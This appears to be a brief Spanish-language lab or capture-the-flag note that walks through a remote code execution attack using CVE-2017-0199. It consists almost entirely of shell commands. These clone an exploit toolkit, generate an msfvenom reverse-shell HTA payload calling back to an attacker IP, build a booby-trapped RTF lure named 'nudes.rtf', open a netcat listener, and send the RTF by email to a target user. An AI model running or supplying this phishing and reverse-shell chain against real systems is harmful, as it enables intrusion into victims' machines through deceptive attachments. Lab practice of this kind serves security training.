
### RCE
```shell
#CLONAMOS EL REPOSITOORIO
git clone https://github.com/bhdresh/CVE-2017-0199.git
cd CVE-2017-0199

#CREAMOS ARCHIVO
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.7 LPORT=443 -f hta-psh -o malicious.hta


#CREACIÓN DEL RTF
sudo python3 -m http.server 80
python2 cve-2017-0199_toolkit.py -M gen -w nudes.rtf -u http://10.10.16.7/malicious.hta -x 0 -t RTF

#EXPLOTACIÓN
sudo rlwrap nc -nlvp 443
sendEmail -f gorka@megabank.com -t nico@megabank.com -u 'IMPORTANTE' -m 'IMPORTANTE' -s 10.10.10.77:25 -a ./nudes.rtf -v  
```